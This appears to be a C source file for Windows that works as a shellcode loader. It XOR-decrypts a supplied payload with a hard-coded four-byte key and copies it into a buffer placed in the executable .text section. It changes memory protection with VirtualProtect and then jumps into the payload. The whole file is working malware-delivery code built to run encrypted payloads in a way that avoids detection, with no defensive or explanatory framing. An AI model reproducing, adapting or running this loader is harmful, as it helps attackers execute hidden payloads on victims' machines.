#include "Header.h"

#define SHELLCODE_SIZE 0xBAAD

typedef VOID( *ENTRY )( );

#pragma section(".text", read)
__declspec( allocate( ".text" ) ) unsigned char Shellcode[ SHELLCODE_SIZE ] = { 0 };


PVOID CopyMemoryEx( _Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length )
{
	PBYTE D = ( PBYTE ) Destination;
	PBYTE S = ( PBYTE ) Source;

	while ( Length-- )
		*D++ = *S++;

	return Destination;
}

VOID Decrypt( PVOID lpBuffer, DWORD dwSize )
{
	DWORD	dwIndex = 0;
	PDWORD	Buffer = ( PDWORD ) lpBuffer;
	CHAR	Key[ 4 ];

	Key[ 0 ] = 0x92;
	Key[ 1 ] = 0x87;
	Key[ 2 ] = 0x21;
	Key[ 3 ] = 0x42;

	while ( dwIndex < dwSize )
	{
		Buffer[ dwIndex ] = Buffer[ dwIndex ] ^ *( DWORD* ) Key;
		dwIndex++;
	}
}

BOOL Inject( PVOID lpBuffer, DWORD dwSize )
{
	DWORD OldProtection = 0;
	PVOID Entry = Shellcode;

	Decrypt( ( PBYTE ) lpBuffer, dwSize / 4 );

	if ( !VirtualProtect( Shellcode, SHELLCODE_SIZE, PAGE_EXECUTE_READWRITE, &OldProtection ) )
	{
		printf( "[!] VirtualProtect Failed (%d)\n", GetLastError( ) );
		goto cleanup;
	}

	CopyMemoryEx( Shellcode, lpBuffer, dwSize );

	if (!VirtualProtect( Shellcode, SHELLCODE_SIZE, OldProtection, &OldProtection ))
	{
		printf( "[!] VirtualProtect Failed (%d)\n", GetLastError( ) );
		goto cleanup;
	}

	( ( ENTRY ) Entry )( );

cleanup:
	memset( lpBuffer, 0, dwSize );
	LocalFree( lpBuffer );
	return ( FALSE );
}
